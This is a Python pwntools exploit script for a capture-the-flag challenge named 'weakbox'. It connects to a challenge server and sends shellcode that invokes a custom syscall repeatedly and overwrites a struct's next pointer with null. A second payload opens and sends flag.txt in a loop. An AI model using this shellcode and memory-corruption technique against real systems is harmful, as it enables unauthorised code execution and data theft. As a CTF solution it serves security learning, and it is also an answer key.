#!/usr/bin/env python3

from pwn import *

exe = ELF("./weakbox")

context.binary = exe


def conn():
    if args.LOCAL:
        # r = process([exe.path])
        r = gdb.debug([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("box.acmcyber.com", 31142)

    return r


def main():
    r = conn()

    # Send the shellcode to create 16 locked structs
    r.sendlineafter(b'choice: ', b'1')
    shc = '''
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall
    mov rax, 690
    syscall

    mov rcx, 10000000000
    loop: dec rcx
    jnz loop

    mov eax, 1
    lea rsi, [rip + 9]
    mov rdx, 0xff
    syscall
    '''
    log.info(f"{asm(shc)=}")
    r.sendafter(b'send shellcode (max 0x1000 bytes): ', asm(shc) + b'A'*0x8 + p64(0x0)) # Overwrite the p->next ptr to 0

    r.sendlineafter(b'choice: ', b'1')
    shc = f'''
    start: 
    {shellcraft.open('flag.txt', 0, 0)}
    mov r10d, 0x1010201
    xor r10d, 0x1010301
    push 1
    pop rdi
    xor edx, edx
    mov rsi, rax
    push SYS_sendfile
    pop rax
    syscall
    jmp start
    '''
    log.info(f"{shc=}")
    r.sendafter(b'send shellcode (max 0x1000 bytes): ', asm(shc)) # Keep attempting to read the flag

    r.interactive()


if __name__ == "__main__":
    main()
